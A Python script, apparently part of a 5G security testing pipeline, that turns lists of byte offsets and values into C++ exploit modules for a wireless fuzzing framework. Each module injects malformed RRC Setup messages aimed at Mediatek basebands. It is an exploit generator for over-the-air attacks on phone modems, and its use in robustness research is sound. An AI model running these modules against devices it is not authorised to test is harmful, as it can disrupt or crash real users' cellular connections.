import os
import datetime

# 定义输入和输出目录
# input_dir = '/home/qiqingh/Desktop/5g_testing/ccsMarchBatch/output/boundary_test_offset_value'
input_dir = '../output/05_calOffset'
# output_dir = '../output/boundary_test_exploits'
output_dir = '../output/06_payloads'
diagnosis_dir = '../diagnosis'
diagnosis_file = os.path.join(diagnosis_dir, '06_exploit_generator_debug.log')
# 确保输出目录和诊断目录存在
os.makedirs(output_dir, exist_ok=True)
os.makedirs(diagnosis_dir, exist_ok=True)

# 初始化诊断日志
def log_message(message, also_print=True):
    """向诊断日志写入信息，并可选择性地打印到控制台"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    
    with open(diagnosis_file, 'a') as log:
        log.write(log_entry)
    
    if also_print:
        print(message)

def read_modifications(file_path):
    """读取 modifications 文件并解析 offset 和 new value"""
    modifications = []
    log_message(f"Attempting to read file: {file_path}")
    
    try:
        with open(file_path, 'r') as file:
            line_count = 0
            valid_line_count = 0
            error_count = 0
            
            for line in file:
                line_count += 1
                stripped_line = line.strip()
                
                # 跳过空行
                if not stripped_line:
                    continue
                    
                log_message(f"Reading line {line_count}: {stripped_line}", False)  # 只记录到日志，不打印
                
                if line.startswith("Offset:"):
                    parts = line.split(", New Value: ")
                    if len(parts) == 2:
                        try:
                            offset = int(parts[0].split("Offset: ")[1])
                            new_value = parts[1].strip()
                            modifications.append((offset, new_value))
                            valid_line_count += 1
                        except ValueError as e:
                            error_msg = f"Error parsing line {line_count}: '{stripped_line}', error: {e}"
                            log_message(error_msg)
                            error_count += 1
                    else:
                        error_msg = f"Skipping line {line_count} due to incorrect format: '{stripped_line}'"
                        log_message(error_msg)
                else:
                    log_message(f"Skipping line {line_count} - does not start with 'Offset:': '{stripped_line}'", False)
            
            summary = f"File stats for {os.path.basename(file_path)}: Total lines: {line_count}, Valid modifications: {valid_line_count}, Errors: {error_count}"
            log_message(summary)
    except Exception as e:
        error_msg = f"ERROR: Failed to read file {file_path}: {str(e)}"
        log_message(error_msg)
        
    log_message(f"Found {len(modifications)} modifications in file: {file_path}")
    return modifications

def generate_exploit_file(modifications, exploit_name, source_file=""):
    """生成 exploit 文件"""
    if not modifications:
        error_msg = f"No modifications found for {exploit_name}, skipping file generation."
        log_message(error_msg)
        return False
    
    exploit_code = """#include <ModulesInclude.hpp>
// Filters
wd_filter_t f1;
// Vars
const char *module_name()
{
    return "Mediatek";
}
// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;
    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");
    return 0;
}
// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);
    return 0;
}
int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
"""
    
    for offset, new_value in modifications:
        exploit_code += f"        pkt_buf[{offset} - 48] = 0x{new_value};\n"
    exploit_code += """        return 1;
    }
    return 0;
}
"""
    
    try:
        output_path = os.path.join(output_dir, exploit_name)
        with open(output_path, 'w') as file:
            file.write(exploit_code)
        log_message(f"Successfully generated exploit: {exploit_name} from {source_file}")
        return True
    except Exception as e:
        error_msg = f"ERROR: Failed to write exploit file {exploit_name}: {str(e)}"
        log_message(error_msg)
        return False

def main():
    """主函数，读取 modifications 并生成 exploit 文件"""
    # 初始化日志
    with open(diagnosis_file, 'w') as log:
        start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log.write(f"[{start_time}] 开始处理 exploit 生成\n")
        log.write(f"输入目录: {input_dir}\n")
        log.write(f"输出目录: {output_dir}\n")
        log.write("-" * 80 + "\n\n")
    
    # 获取目录下所有文件
    all_files = os.listdir(input_dir)
    txt_files = [f for f in all_files if f.endswith('.txt')]
    
    log_message(f"发现目录中共有 {len(all_files)} 个文件，其中 {len(txt_files)} 个.txt文件")
    
    if not txt_files:
        log_message("目录中没有发现.txt文件，无法生成exploit")
        return
    
    # 处理文件
    success_count = 0
    error_count = 0
    empty_files = 0
    
    for filename in txt_files:
        file_path = os.path.join(input_dir, filename)
        log_message(f"\n开始处理文件: {filename}")
        
        # 检查文件大小
        file_size = os.path.getsize(file_path)
        if file_size == 0:
            log_message(f"警告: 文件 {filename} 为空 (0字节)，跳过处理")
            empty_files += 1
            continue
            
        # 读取修改列表
        modifications = read_modifications(file_path)
        
        if not modifications:
            log_message(f"文件 {filename} 中没有找到有效的修改指令，跳过生成")
            error_count += 1
            continue
            
        # 生成exploit文件
        exploit_name = filename.replace('.txt', '.cpp')
        if generate_exploit_file(modifications, exploit_name, filename):
            success_count += 1
        else:
            error_count += 1
    
    # 处理总结
    summary = f"""
处理完成！总结:
- 总共找到 {len(txt_files)} 个.txt文件
- 成功生成 {success_count} 个exploit文件
- 跳过或失败 {error_count} 个文件
- 空文件 {empty_files} 个
"""
    log_message(summary)

if __name__ == '__main__':
    main()
    print(f"Generated exploits saved in {output_dir}")
    print(f"Debug logs saved in {diagnosis_file}")